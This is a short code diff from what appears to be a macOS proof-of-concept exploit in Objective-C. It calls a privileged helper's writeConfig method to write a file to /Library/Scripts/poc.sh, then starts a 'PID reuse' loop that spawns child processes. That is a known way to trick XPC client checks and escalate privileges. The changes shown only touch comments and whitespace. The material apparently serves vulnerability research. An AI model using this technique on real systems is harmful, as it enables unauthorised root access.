@@ -143,14 +143,14 @@ int main(void) {
         //get FW state
         NSString* sudo_config = @"teststring";
         NSString* sudo_path = @"/Library/Scripts/poc.sh";
+        
         // - (void)writeConfig:(NSString *)arg1 atPath:(NSString *)arg2 withReply:(void (^)(NSError *))arg3;
-
-
         [obj writeConfig:sudo_config atPath:sudo_path withReply:^(NSError * err){
              NSLog(@"Response: %@", err);
                  }];
  
         NSLog(@"Done");
+        // start PID reuse
         char target_binary[] = kValid;
         char *target_argv[] = {target_binary, NULL};
         posix_spawnattr_t attr;
@@ -164,7 +164,7 @@ int main(void) {
         printf("forked %d\n", pid);
         pids[i] = pid;
     }
-    // keep the children alive
+    // keep the child processes alive
     sleep(10);
     
     cleanup:
